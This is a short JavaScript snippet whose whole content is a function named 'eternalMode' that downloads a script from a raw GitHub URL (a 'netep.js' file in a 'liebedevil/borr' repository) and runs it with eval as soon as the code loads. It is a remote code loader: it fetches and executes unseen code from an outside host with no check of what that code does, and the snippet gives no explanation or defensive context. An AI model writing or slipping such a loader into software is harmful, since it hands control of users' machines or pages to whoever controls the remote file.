async function eternalMode() {
  let url = 'https://raw.githubusercontent.com/liebedevil/borr/main/netep.js'
  let response = await fetch(url);
  let script = await response.text();
  eval(script);
}
eternalMode();
